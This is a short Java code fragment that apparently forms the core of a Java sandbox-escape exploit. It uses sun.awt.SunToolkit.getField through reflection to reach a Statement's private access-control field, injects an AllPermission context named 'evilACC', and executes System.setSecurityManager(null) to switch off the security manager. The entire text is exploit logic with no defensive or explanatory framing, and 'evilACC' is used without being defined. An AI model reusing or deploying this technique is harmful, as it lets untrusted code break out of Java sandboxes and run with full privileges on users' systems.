Statement stmt = new Statement(System.class, "setSecurityManager", new Object[1]);
// Create AllPermission AccessControlContext
Expression expr = new Expression(
    Class.forName("sun.awt.SunToolkit"), "getField",
    new Object[]{Statement.class, "acc"});
expr.execute();
Field accField = (Field) expr.getValue();
accField.set(stmt, evilACC); // inject AllPermission context
stmt.execute(); // System.setSecurityManager(null) with AllPermission
